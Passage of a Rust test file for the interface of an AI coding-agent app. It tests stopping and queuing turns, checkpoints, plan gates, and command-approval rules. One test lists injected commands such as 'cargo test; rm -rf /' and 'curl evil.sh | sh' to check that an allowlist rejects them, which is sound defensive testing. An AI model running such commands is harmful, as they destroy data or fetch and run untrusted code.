    fn stopping_closes_the_open_row_and_clears_what_the_turn_was_holding() {
        let mut s = State { sending: true, ..open_state() };
        tool_call(&mut s, "a.rs");
        assert_eq!(s.outstanding.as_deref(), Some("a.rs"), "the server is parked on this call");

        let _ = update(&mut s, &client(), Message::Stop);
        assert!(!s.sending);
        assert!(s.stopped);
        assert_eq!(results(&s), vec!["stopped by you"], "not blamed on the turn or the model");
        assert!(s.outstanding.is_none(), "answered on the way out, so nothing is owed twice");

        // The frames already in flight when the abort landed must not reopen the
        // turn — a `Done` here used to raise "the model ended the turn without
        // replying" for a turn the user themselves ended.
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(s.error.is_none());
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::Assistant("late answer".into())),
        );
        assert_eq!(s.turns.len(), 1, "a stopped turn takes no more rows");

        // And a second press is a no-op rather than a second checkpoint.
        let _ = update(&mut s, &client(), Message::Stop);
        assert_eq!(results(&s), vec!["stopped by you"]);

        // The next send clears the flag, or every later frame would be dropped.
        s.draft = "again".into();
        let _ = update(&mut s, &client(), Message::Send);
        assert!(!s.stopped);
        assert!(s.sending);
    }

    /// Typing during a turn queues, and the queue advances off the *checkpoint*
    /// rather than off `Done` — the ordering that keeps the finished turn's
    /// commit from containing the next turn's changes.
    #[test]
    fn follow_ups_typed_during_a_turn_run_in_order_after_it() {
        let mut s = State { draft: "first".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        assert!(s.sending);

        for text in ["second", "third"] {
            s.draft = text.into();
            let _ = update(&mut s, &client(), Message::Send);
        }
        assert_eq!(s.queue, vec!["second", "third"], "in the order they were typed");
        assert!(s.draft.is_empty(), "the box is emptied, so the next one can be typed");
        assert_eq!(s.turns.len(), 1, "queued follow-ups are not turns yet");

        // The turn ends. `Done` alone must not start the next one: the previous
        // turn's commit has not been taken yet.
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(s.draft.is_empty(), "still waiting on the checkpoint");
        assert_eq!(s.queue.len(), 2);

        // The checkpoint lands, and the next follow-up becomes the draft the
        // dispatched `Send` will pick up.
        let _ = update(&mut s, &client(), Message::Committed(Ok(false)));
        assert_eq!(s.draft, "second");
        assert_eq!(s.queue, vec!["third"]);

        let _ = update(&mut s, &client(), Message::Send);
        assert!(s.sending);
        assert!(matches!(&s.turns[1], Turn::User(t) if t == "second"));
    }

    /// A stop is the user ending the work, so what is behind it waits rather than
    /// starting on its own — and pressing a chip is how it gets back out, without
    /// losing what was typed.
    #[test]
    fn a_stop_leaves_the_queue_alone_and_a_chip_goes_back_to_the_composer() {
        let mut s = State { draft: "go".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        s.draft = "and also this".into();
        let _ = update(&mut s, &client(), Message::Send);

        let _ = update(&mut s, &client(), Message::Stop);
        let _ = update(&mut s, &client(), Message::Committed(Ok(true)));
        assert_eq!(s.queue, vec!["and also this"], "a stopped turn does not run the next one");
        assert!(s.draft.is_empty());

        let _ = update(&mut s, &client(), Message::Unqueue(0));
        assert!(s.queue.is_empty());
        assert_eq!(s.draft, "and also this");
        // Out of range is a no-op rather than a panic: the chips are indexed by
        // position, and a click can land on a list that has already moved.
        let _ = update(&mut s, &client(), Message::Unqueue(3));
        assert_eq!(s.draft, "and also this");
    }

    /// The steer: the correction jumps the queue, and it is the stop's own
    /// checkpoint that starts it — not a second turn racing that commit.
    #[test]
    fn stop_and_send_puts_the_correction_at_the_front() {
        let mut s = State { draft: "do the thing".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        s.draft = "then tidy up".into();
        let _ = update(&mut s, &client(), Message::Send);

        s.draft = "no — stop, do it the other way".into();
        let _ = update(&mut s, &client(), Message::StopAndSend);
        assert!(!s.sending, "the turn it was steering away from is over");
        assert_eq!(s.queue, vec!["no — stop, do it the other way", "then tidy up"]);

        let _ = update(&mut s, &client(), Message::Committed(Ok(true)));
        assert_eq!(s.draft, "no — stop, do it the other way", "the correction goes first");
        assert_eq!(s.queue, vec!["then tidy up"]);

        // Nothing typed, nothing to steer with — and a plain Stop is faster.
        let mut s = State { draft: "x".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        s.draft.clear();
        let _ = update(&mut s, &client(), Message::StopAndSend);
        assert!(s.sending, "an empty steer is not a stop");
    }

    /// Follow mode opens what the agent writes, *after* it has written it — and
    /// only for a write that worked. Opening on the call would show the version
    /// being replaced, which is the opposite of watching it work.
    #[test]
    fn follow_mode_opens_the_file_the_turn_just_wrote() {
        let root = std::env::temp_dir().join("coder-follow-test");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        std::fs::write(root.join("a.rs"), "fn main() {}").unwrap();
        let mut s = State {
            follow: true,
            thread_id: Some(7),
            ..State::with_root(root.to_str().unwrap())
        };

        let write = |s: &mut State, path: &str| {
            let _ = update(
                s,
                &client(),
                Message::Event(CoderEvent::ToolCall {
                    call_id: path.into(),
                    name: "write_file".into(),
                    arguments: serde_json::json!({ "path": path, "content": "x" }),
                }),
            );
        };

        write(&mut s, "a.rs");
        assert!(s.viewing.is_none(), "not until the write has actually happened");
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "write_file".into(),
                content: "Wrote a.rs".into(),
            }),
        );
        assert!(matches!(&s.viewing, Some((p, _)) if p.ends_with("a.rs")));
        assert_eq!(s.dock, Dock::File, "and the dock is on it");

        // A write that failed has nothing to show, and the row already says why.
        s.viewing = None;
        write(&mut s, "a.rs");
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "write_file".into(),
                content: "Error: Path escapes the workspace root and was blocked: a.rs".into(),
            }),
        );
        assert!(s.viewing.is_none());

        // A read is not a write: following those would move the dock under the
        // user for every file the agent skims while exploring.
        tool_call(&mut s, "a.rs");
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "read_file".into(),
                content: "fn main() {}".into(),
            }),
        );
        assert!(s.viewing.is_none());

        // And with follow off, a write opens nothing.
        let _ = update(&mut s, &client(), Message::ToggleFollow(false));
        write(&mut s, "a.rs");
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "write_file".into(),
                content: "Wrote a.rs".into(),
            }),
        );
        assert!(s.viewing.is_none());
    }

    /// Stopping while the turn is parked on the approval gate: `sending` is false
    /// there, so there is nothing to stop and the card must survive — Esc on this
    /// screen must not silently drop a decision the server is still holding.
    #[test]
    fn stopping_does_nothing_while_a_decision_is_outstanding() {
        let mut s = State {
            pending: Some(Pending { call_id: "c1".into(), command: "cargo test".into() }),
            ..open_state()
        };
        let _ = update(&mut s, &client(), Message::Stop);
        assert!(s.pending.is_some(), "the decision is still the server's to hear");
        assert!(!s.stopped);
    }

    fn checkpoint(sha: &str, message: &str) -> crate::coder_git::Checkpoint {
        crate::coder_git::Checkpoint {
            sha: sha.into(),
            message: message.into(),
            when: "2 minutes ago".into(),
        }
    }

    /// Restoring is `git reset --hard`: it discards every change since that
    /// checkpoint, the user's own included. One press must not be enough.
    #[test]
    fn restoring_a_checkpoint_takes_two_presses() {
        let mut s = open_state();
        let _ = update(
            &mut s,
            &client(),
            Message::CheckpointsLoaded(Ok(vec![
                checkpoint("aaaaaaaa1111", "bump the version"),
                checkpoint("bbbbbbbb2222", "baseline"),
            ])),
        );
        assert_eq!(s.checkpoints.len(), 2);

        let _ = update(&mut s, &client(), Message::ReviewCheckpoint("aaaaaaaa1111".into()));
        assert!(matches!(&s.reviewing, Some((sha, None)) if sha == "aaaaaaaa1111"), "opens empty");
        let _ = update(&mut s, &client(), Message::DiffLoaded(Ok("+two\n-one".into())));
        assert!(matches!(&s.reviewing, Some((_, Some(d))) if d.contains("+two")));

        let _ = update(&mut s, &client(), Message::RestoreCheckpoint("aaaaaaaa1111".into()));
        assert_eq!(s.restore_armed.as_deref(), Some("aaaaaaaa1111"), "armed, not fired");
        // Looking at a different one disarms it — the second press must mean
        // the same checkpoint the first one did.
        let _ = update(&mut s, &client(), Message::ReviewCheckpoint("bbbbbbbb2222".into()));
        assert_eq!(s.restore_armed, None);

        let _ = update(&mut s, &client(), Message::RestoreCheckpoint("bbbbbbbb2222".into()));
        let _ = update(&mut s, &client(), Message::RestoreCheckpoint("bbbbbbbb2222".into()));
        assert_eq!(s.restore_armed, None, "fired, and disarmed behind itself");

        let _ = update(&mut s, &client(), Message::CloseReview);
        assert!(s.reviewing.is_none());
    }

    /// The shell is a real process in the user's folder, so the two things that
    /// matter are that it needs a folder and that closing the drawer actually
    /// ends it — `Session`'s drop sends the PTY a shutdown, and a shell still
    /// running behind a closed drawer is one nobody can reason about.
    ///
    /// This spawns a real PowerShell (ConPTY), which is the point: it is the
    /// part of the feature no state-machine test reaches.
    #[test]
    fn a_terminal_needs_a_folder_and_ends_when_the_drawer_closes() {
        let mut s = State::default();
        let _ = update(&mut s, &client(), Message::ToggleTerminal);
        assert!(s.term.is_none(), "no folder, nothing to open a shell in");
        let _ = update(&mut s, &client(), Message::SendToTerminal("cargo test".into()));
        assert!(s.term.is_none());

        let root = std::env::temp_dir();
        let mut s = State::with_root(root.to_str().unwrap());
        let _ = update(&mut s, &client(), Message::ToggleTerminal);
        assert!(s.term.is_some(), "a real PTY in the workspace root");

        let _ = update(&mut s, &client(), Message::ToggleTerminal);
        assert!(s.term.is_none(), "closing ends the shell rather than hiding it");
    }

    /// The widget keys its event subscription on the terminal id, so a reopened
    /// drawer that reused one would be a new PTY wired to the old subscription.
    #[test]
    fn reopening_never_reuses_a_terminal_id() {
        let mut s = State::with_root(std::env::temp_dir().to_str().unwrap());
        let _ = update(&mut s, &client(), Message::ToggleTerminal);
        let first = s.term.as_ref().unwrap().0.id;
        let _ = update(&mut s, &client(), Message::ToggleTerminal);
        let _ = update(&mut s, &client(), Message::ToggleTerminal);
        let second = s.term.as_ref().unwrap().0.id;
        assert_ne!(first, second);

        // Sending opens one if the drawer was shut, so a command never lands in
        // a terminal that is not there.
        let _ = update(&mut s, &client(), Message::ToggleTerminal);
        assert!(s.term.is_none());
        let _ = update(&mut s, &client(), Message::SendToTerminal("cargo test".into()));
        assert!(s.term.is_some());
    }

    /// The pane walks the folder itself, so this drives it against a real one.
    #[test]
    fn the_file_pane_walks_only_what_is_open() {
        let root = std::env::temp_dir().join("coder-pane-test");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("src")).unwrap();
        std::fs::write(root.join("src").join("app.rs"), "fn main() {}").unwrap();
        std::fs::write(root.join("README.md"), "hi").unwrap();

        let mut s = State::with_root(root.to_str().unwrap());
        assert!(s.tree.is_empty(), "a closed pane walks nothing");

        let _ = update(&mut s, &client(), Message::ToggleFiles);
        let names = |s: &State| s.tree.iter().map(|e| e.name.clone()).collect::<Vec<_>>();
        assert_eq!(names(&s), vec!["src", "README.md"], "one level, dirs first");

        let _ = update(&mut s, &client(), Message::ToggleDir(root.join("src")));
        assert_eq!(names(&s), vec!["src", "app.rs", "README.md"], "expanded in place");

        let _ = update(&mut s, &client(), Message::OpenFile(root.join("src").join("app.rs")));
        assert!(matches!(&s.viewing, Some((_, Ok(t))) if t == "fn main() {}"));

        // Closing puts the walk away with it; the expansion survives, so
        // reopening lands where it was left.
        let _ = update(&mut s, &client(), Message::ToggleFiles);
        assert!(s.tree.is_empty());
        let _ = update(&mut s, &client(), Message::ToggleFiles);
        assert_eq!(names(&s), vec!["src", "app.rs", "README.md"]);

        let _ = update(&mut s, &client(), Message::CloseFile);
        assert!(s.viewing.is_none());
    }

    /// git may not be installed. That must read as "no history of your work",
    /// never as "the turn failed" — the turn ran either way.
    #[test]
    fn a_checkpoint_failure_is_not_a_turn_failure() {
        let mut s = open_state();
        let _ = update(
            &mut s,
            &client(),
            Message::Committed(Err("could not run git — is it installed?".into())),
        );
        assert!(s.checkpoint_error.as_deref().unwrap().contains("git"));
        assert_eq!(s.error, None, "the banner means the turn went wrong");

        // …and it clears once one lands.
        let _ = update(&mut s, &client(), Message::CheckpointsLoaded(Ok(vec![])));
        assert_eq!(s.checkpoint_error, None);
    }

    /// The plan opens the turn as an assistant row — the same row a reopened
    /// session rebuilds from the stored log — but it is not the turn's *answer*.
    /// A model that writes a plan and then dies silently is still a silent turn,
    /// and that is the failure this screen exists to name.
    #[test]
    fn a_plan_is_a_row_but_not_an_answer() {
        let mut s = State { draft: "add a test".into(), plan_mode: PlanMode::Inline, ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Plan("1. read it".into())));
        assert!(matches!(&s.turns[1], Turn::Assistant { text, .. } if text == "1. read it"));

        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(
            s.error.as_deref().unwrap_or_default().contains("without replying"),
            "a plan is not an answer: {:?}",
            s.error
        );

        // An empty one is dropped rather than rendered as a blank bubble, the
        // same way an empty assistant message is.
        let mut s = open_state();
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Plan("  ".into())));
        assert!(s.turns.is_empty());
    }

    /// The gate, end to end: the first turn is tool-free and ends on a card
    /// rather than on a diff, and what the card holds after an edit is what the
    /// second turn is handed. Both halves matter — a gate that ran the model's
    /// plan instead of the user's is an expensive way to lose an argument.
    #[test]
    fn the_gate_plans_tool_free_then_runs_the_edited_plan() {
        let root = std::env::temp_dir().join("coder-gate-plan");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(&root).unwrap();
        let mut s = State {
            thread_id: Some(7),
            plan_mode: PlanMode::Gate,
            draft: "add a test".into(),
            ..State::with_root(&root.display().to_string())
        };

        let _ = update(&mut s, &client(), Message::Send);
        assert!(matches!(&s.turns[0], Turn::User(t) if t == "add a test"), "the row is what was typed");
        assert!(turn_tools(&s).is_empty(), "a planning turn that can edit is not a gate");
        assert!(mode_instruction(&s).unwrap().contains("plan and nothing else"));

        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Assistant("1. read it".into())));
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        let card = s.plan_card.as_ref().expect("the plan turn ends on the card");
        assert_eq!(card.text().trim(), "1. read it");
        assert!(s.would_queue(), "the composer queues while the plan waits on the user");

        // The edit is the point of the gate.
        s.plan_card = Some(text_editor::Content::with_text("1. read it
2. and the docs"));
        let _ = update(&mut s, &client(), Message::PlanRun);
        let last = match s.turns.last() {
            Some(Turn::User(t)) => t.clone(),
            other => panic!("the run turn is a user row: {other:?}"),
        };
        assert!(last.contains("2. and the docs"), "the edited plan is what runs: {last}");
        assert!(!turn_tools(&s).is_empty(), "the run turn has the tools the plan needs");
        assert!(!mode_instruction(&s).unwrap().contains("plan and nothing else"));
        assert_eq!(
            std::fs::read_to_string(root.join(".agent/plan.md")).unwrap(),
            "1. read it
2. and the docs",
            "the plan is also a file the user can open in their own editor",
        );
    }

    /// An `@path` is inlined into the message that is sent, which is also the
    /// message that is stored — so the row and the rebuild agree, and the view
    /// folds the tail away rather than the state hiding it.
    #[test]
    fn a_mentioned_file_rides_in_the_message_it_was_mentioned_in() {
        let root = std::env::temp_dir().join("coder-mentions");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join("src")).unwrap();
        std::fs::write(root.join("src/app.rs"), "fn boot() {}\n").unwrap();

        let out = expand_mentions(&root, "@src/app.rs and @src/app.rs, what does boot do?");
        assert!(out.starts_with("@src/app.rs and @src/app.rs, what does boot do?"));
        assert_eq!(out.matches("fn boot() {}").count(), 1, "the same file twice is once");
        assert!(out.contains(MENTION_MARKER));

        // An `@` that is not a file is prose, not a failure: a message must not
        // half-send because someone wrote an address in it.
        let plain = "ask @tanveer about @src/missing.rs";
        assert_eq!(expand_mentions(&root, plain), plain);
    }

    /// A plan turn that says nothing must not offer the *last* turn's answer as
    /// this turn's plan — the card is a Run button, and running the wrong text
    /// is worse than the silent turn that produced it.
    #[test]
    fn a_silent_plan_turn_leaves_no_card_to_run() {
        let mut s = State { plan_mode: PlanMode::Gate, draft: "add a test".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Assistant("1. read it".into())));
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(s.plan_card.is_some());

        let _ = update(&mut s, &client(), Message::PlanDiscard);
        s.draft = "and the docs too".into();
        let _ = update(&mut s, &client(), Message::Send);
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(s.plan_card.is_none(), "the previous plan is not this turn's");
        assert!(s.error.as_deref().unwrap_or_default().contains("without replying"));
    }

    /// `mode_instruction` is `max_length=4096` server-side and a longer one is a
    /// 422 — no turn at all. The notes cap and the gate's ask share that field.
    #[test]
    fn the_notes_and_the_plan_ask_together_still_fit_the_field() {
        let root = std::env::temp_dir().join("coder-gate-instruction");
        let _ = std::fs::remove_dir_all(&root);
        std::fs::create_dir_all(root.join(".agent")).unwrap();
        std::fs::write(root.join(crate::coder_notes::REL_PATH), "x".repeat(50_000)).unwrap();
        let mut s =
            State { kind: TurnKind::Plan, ..State::with_root(&root.display().to_string()) };
        let block = mode_instruction(&s).unwrap();
        assert!(block.chars().count() <= MAX_MODE_INSTRUCTION, "{}", block.chars().count());
        assert!(block.contains("plan and nothing else"), "the ask must survive the cap");

        s.kind = TurnKind::Work;
        assert!(!mode_instruction(&s).unwrap().contains("plan and nothing else"));
    }

    /// The checklist is screen state, so its call never reaches the executor —
    /// but it is still a delegated call the server is parked on, and answering
    /// it is not optional.
    #[test]
    fn the_checklist_is_answered_here_and_rebuilds_from_the_log() {
        let mut s = open_state();
        let args = serde_json::json!({"items": [
            {"text": "read the module", "done": true},
            {"text": "add the test", "done": false},
            {"text": "", "done": false},
        ]});
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolCall {
                call_id: "c1".into(),
                name: "update_todos".into(),
                arguments: args.clone(),
            }),
        );
        assert_eq!(
            s.todos,
            vec![
                Todo { text: "read the module".into(), done: true },
                Todo { text: "add the test".into(), done: false },
            ],
            "an item with no text is a blank row in a pinned panel",
        );
        assert_eq!(s.outstanding.as_deref(), Some("c1"), "the server is parked on it like any other");
        assert!(matches!(&s.turns[0], Turn::Tool { label, .. } if label == "todos 1/2"));

        // A mangled call leaves the last good list up rather than blanking the
        // panel, and says so where the model can read it.
        let before = s.todos.clone();
        let refused = s.set_todos(&serde_json::json!({"items": []}));
        assert!(refused.starts_with("Error:"), "{refused}");
        assert_eq!(s.todos, before);

        // Reopened: the same list, off the arguments the server already stored.
        let messages = vec![serde_json::json!({
            "role": "assistant",
            "content": "",
            "tool_calls": [{
                "id": "c1",
                "type": "function",
                "function": {"name": "update_todos", "arguments": args.to_string()},
            }],
        })];
        assert_eq!(rebuild_todos(&messages), before);
    }

    /// Found by running it: `llama3` (the server's resolved default) read the
    /// file, then ended the turn with an empty reply. Empty assistant messages
    /// are dropped, so the screen rendered nothing at all and read as a hang.
    #[test]
    fn a_turn_that_says_nothing_says_so() {
        let mut s = State { draft: "do a thing".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        tool_call(&mut s, "a.rs");
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolResult {
                name: "read_file".into(),
                content: "x".into(),
            }),
        );
        // The step that only calls a tool sends an empty assistant message, and
        // so does this model's final answer.
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Assistant(String::new())));
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert!(!s.sending);
        assert!(
            s.error.as_deref().unwrap_or_default().contains("without replying"),
            "a silent turn must not render as nothing: {:?}",
            s.error
        );

        // A turn that did answer says nothing extra.
        let mut s = State { draft: "again".into(), ..open_state() };
        let _ = update(&mut s, &client(), Message::Send);
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Assistant("Done.".into())));
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert_eq!(s.error, None);
    }

    #[test]
    fn switching_provider_drops_a_model_the_new_one_does_not_have() {
        use agent_platform_client::types::*;
        let entry = |id: &str, models: &[&str]| ProviderEntry {
            id: id.into(),
            label: id.into(),
            configured: true,
            local: true,
            models: ProviderModels {
                options: models.iter().map(|m| m.to_string()).collect(),
                selected_model: String::new(),
                source: "discovery".into(),
                warning: None,
                fallback_note: None,
            },
        };
        let mut s = open_state();
        let _ = update(
            &mut s,
            &client(),
            Message::CatalogLoaded(Ok(vec![
                entry("ollama", &["gemma4:latest"]),
                entry("lm_studio", &["qwen/qwen3-coder-30b"]),
            ])),
        );
        let _ = update(&mut s, &client(), Message::ModelChanged("gemma4:latest".into()));
        let _ = update(&mut s, &client(), Message::ProviderChanged("lm_studio".into()));
        assert!(s.model.is_empty(), "an ollama alias sent at LM Studio crashes llama-server");
        assert_eq!(s.model_options(), vec!["qwen/qwen3-coder-30b"]);
    }

    /// The server pins a model on the thread and falls back to it, so a
    /// reopened session must put the header back on it — otherwise the next
    /// turn sends the last session's pick and the conversation changes model
    /// halfway through.
    #[test]
    fn reopening_a_session_restores_the_model_it_was_answered_on() {
        use agent_platform_client::types::*;
        let mut s = State {
            provider: "ollama".into(),
            model: "gemma4:latest".into(),
            catalog: vec![ProviderEntry {
                id: "lm_studio".into(),
                label: "LM Studio".into(),
                configured: true,
                local: true,
                models: ProviderModels {
                    options: vec!["qwen/qwen3-coder-30b".into()],
                    selected_model: String::new(),
                    source: "discovery".into(),
                    warning: None,
                    fallback_note: None,
                },
            }],
            ..open_state()
        };
        let _ = update(
            &mut s,
            &client(),
            Message::ThreadLoaded(Ok(Box::new(CoderThreadOut {
                thread_id: 7,
                title: "older".into(),
                workspace_root: None,
                model: Some("qwen/qwen3-coder-30b".into()),
                messages: vec![],
            }))),
        );
        assert_eq!(s.model, "qwen/qwen3-coder-30b");
        assert_eq!(s.provider, "lm_studio", "the provider comes back off the catalog");

        // A thread that never pinned one keeps whatever is selected now.
        let _ = update(
            &mut s,
            &client(),
            Message::ThreadLoaded(Ok(Box::new(CoderThreadOut {
                thread_id: 8,
                title: "unpinned".into(),
                workspace_root: None,
                model: None,
                messages: vec![],
            }))),
        );
        assert_eq!(s.model, "qwen/qwen3-coder-30b");
    }

    /// A rule allows a program, and the head of a line is not the line. This is
    /// the whole security value of the tier: `cargo test` is a promise about
    /// cargo, and `cargo test; rm -rf /` is not that command.
    #[test]
    fn a_rule_does_not_stretch_past_the_command_it_names() {
        let rules = vec!["cargo test".to_string(), "ls".to_string()];
        assert!(allowed_by_rule(&rules, "cargo test"));
        assert!(allowed_by_rule(&rules, "cargo test --lib -- --nocapture"));
        assert!(allowed_by_rule(&rules, "  ls  "), "surrounding space is not a different command");

        assert!(!allowed_by_rule(&rules, "cargo testbed"), "a word boundary, not a prefix");
        assert!(!allowed_by_rule(&rules, "cargo publish"));
        assert!(!allowed_by_rule(&rules, "cargo test; rm -rf /"), "the tail is a second command");
        assert!(!allowed_by_rule(&rules, "cargo test && curl evil.sh | sh"));
        assert!(!allowed_by_rule(&rules, "ls > /etc/passwd"));
        assert!(!allowed_by_rule(&rules, "ls `whoami`"));
        assert!(!allowed_by_rule(&[], "cargo test"), "no rules allows nothing");
        assert!(!allowed_by_rule(&["".to_string()], "anything"), "an empty rule is not a wildcard");
    }

    /// What **Always allow** actually promises. Wide enough to be worth pressing,
    /// narrow enough that `cargo` does not come to mean `cargo publish`.
    #[test]
    fn the_saved_rule_is_the_program_and_its_verb() {
        assert_eq!(rule_for("cargo test --lib"), "cargo test");
        assert_eq!(rule_for("npm run dev"), "npm run");
        assert_eq!(rule_for("ls"), "ls");
        assert_eq!(rule_for("ls -la"), "ls", "a flag is not a subcommand");
        assert_eq!(rule_for("python scripts/x.py"), "python", "nor is a path");
        assert_eq!(rule_for("python main.py"), "python", "nor is a bare filename");
        assert_eq!(rule_for("node server.js"), "node");
        assert_eq!(rule_for("   "), "");
    }

    /// The tier's whole point: the second `cargo test` of a session does not
    /// stop the turn, and the row says why it did not.
    #[test]
    fn an_allowed_command_runs_without_a_card_and_the_row_says_which_rule() {
        let mut s = State { sending: true, autonomy: Autonomy::Allowlist, ..open_state() };
        s.allow_rule("cargo test".into());
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c1".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test --lib" }),
            }),
        );
        assert!(s.pending.is_none(), "a rule answered it; nothing is waiting on the user");
        assert!(s.sending, "the turn carried on");

        // The row for it comes off the resumed stream, and it is the only place
        // the user ever sees this command.
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ToolCall {
                call_id: "c1".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test --lib" }),
            }),
        );
        match s.turns.last() {
            Some(Turn::Tool { label, .. }) => {
                assert!(label.contains("cargo test --lib"), "got {label:?}");
                assert!(label.contains("allowed by rule"), "an unread approval must say so: {label:?}");
            }
            other => panic!("expected the command's row, got {other:?}"),
        }

        // A rule for cargo is not a rule for everything cargo can do.
        let mut s = State { sending: true, autonomy: Autonomy::Allowlist, ..open_state() };
        s.allow_rule("cargo test".into());
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c2".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo publish" }),
            }),
        );
        assert!(s.pending.is_some(), "an unmatched command is still a card");
    }

    /// Always allow is one press doing three things, and the third is the one
    /// that makes the other two mean anything.
    #[test]
    fn always_allow_saves_the_rule_for_this_folder_and_turns_the_tier_on() {
        let mut s = State { sending: true, autonomy: Autonomy::Ask, ..open_state() };
        let _ = update(
            &mut s,
            &client(),
            Message::Event(CoderEvent::ApprovalRequired {
                call_id: "c1".into(),
                name: "run_command".into(),
                arguments: serde_json::json!({ "command": "cargo test --lib" }),
            }),
        );
        let _ = update(&mut s, &client(), Message::AlwaysAllow);
        assert_eq!(s.rules(), ["cargo test"], "the rule is the verb, not the whole line");
        assert_eq!(s.autonomy, Autonomy::Allowlist, "a rule nothing consults does nothing");
        assert_eq!(
            s.allowlist.get("D:/work/demo").map(Vec::len),
            Some(1),
            "rules are the folder's, not the app's"
        );

        // Another folder does not inherit it.
        let _ = update(&mut s, &client(), Message::RootPicked(Some("D:/work/other".into())));
        assert!(s.rules().is_empty(), "a folder you just opened has approved nothing");
    }


    /// Rebuild == live, against the bytes the server actually persisted.
    ///
    /// Captured from a driven turn (`qwen3-coder:30b`, 2026-08-19): the live
    /// `tool_call` frame carries `arguments` as an **object**, and the same call
    /// read back out of the thread carries it as a **JSON string**. The panel
    /// has to show the same three items either way, so this pins the shape the
    /// server writes rather than the shape the stream sends.
    #[test]
    fn the_checklist_rebuilds_from_the_shape_the_server_actually_stores() {
        let messages = vec![serde_json::json!({
            "role": "assistant",
            "content": "",
            "tool_calls": [{
                "id": "call_6s4vy2z4",
                "index": 0,
                "type": "function",
                "function": { "name": "update_todos", "arguments": "{\"items\":[{\"done\":true,\"text\":\"Add a subtract(a, b) function to main.py\"},{\"done\":true,\"text\":\"Add a multiply(a, b) function to main.py\"},{\"done\":false,\"text\":\"Add a one-line docstring to each of the two new functions\"}]}" }
            }]
        })];
        let todos = rebuild_todos(&messages);
        assert_eq!(todos.len(), 3, "got {todos:?}");
        assert_eq!(todos[0].text, "Add a subtract(a, b) function to main.py");
        assert!(todos[0].done);
        assert!(!todos[2].done, "the flag survives the string form too");

        // The live shape of the same call has to reach the same panel.
        let live = parse_todos(&serde_json::json!({
            "items": [{ "text": "Add a subtract(a, b) function to main.py", "done": true }]
        }));
        assert_eq!(live[0].text, todos[0].text);
    }

    /// The handoff: one tool-free turn, and its answer opens the next session
    /// with the summary already typed. The old thread keeps it as its last row.
    #[test]
    fn a_handoff_starts_the_next_session_with_what_this_one_learned() {
        let mut s = open_state();
        s.turns.push(Turn::User("the long conversation".into()));

        let _ = update(&mut s, &client(), Message::Fork);
        assert!(s.sending);
        assert!(turn_tools(&s).is_empty(), "a handoff has nothing to run");

        s.answered = true;
        s.turns.push(Turn::Assistant { text: "Goal: ship X. Done: Y.".into(), md: Vec::new() });
        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));

        assert_eq!(s.draft, "Goal: ship X. Done: Y.", "typed, not sent — it is editable");
        assert_eq!(s.thread_id, None, "the next send opens a thread of its own");
        assert!(s.turns.is_empty(), "a fresh session, not the old one with a summary in it");
        assert_eq!(s.root, Some(PathBuf::from("D:/work/demo")), "same folder");
        assert_eq!(s.error, None);
    }

    /// A handoff that said nothing must not throw the session away — that is
    /// the one failure here that loses work rather than wasting a call.
    #[test]
    fn an_empty_handoff_leaves_the_session_standing() {
        let mut s = open_state();
        s.turns.push(Turn::User("the long conversation".into()));
        let _ = update(&mut s, &client(), Message::Fork);

        let _ = update(&mut s, &client(), Message::Event(CoderEvent::Done));
        assert_eq!(s.thread_id, Some(7), "the session is still the one it was");
        assert!(s.error.is_some(), "and it says why nothing happened");
    }

    /// The review pass: a fresh turn with no tools, carrying the patch. Its
    /// prompt is built here, so the `@@` hunk headers in it are not mentions.
    #[test]
    fn the_review_pass_hands_the_diff_back_tool_free() {
        let mut s = open_state();
        let _ = update(
            &mut s,
            &client(),
            Message::ReviewDiffLoaded(Ok("@@ -1,3 +1,3 @@\n-old\n+new".into())),
        );
        assert!(s.sending, "the review is a turn like any other");
        assert!(turn_tools(&s).is_empty(), "a reviewer that can edit is not a reviewer");
        assert!(s.in_flight.contains("+new"), "the patch is the message");
        assert!(!s.in_flight.contains(MENTION_MARKER), "a hunk header is not an @mention");
        match s.turns.last() {
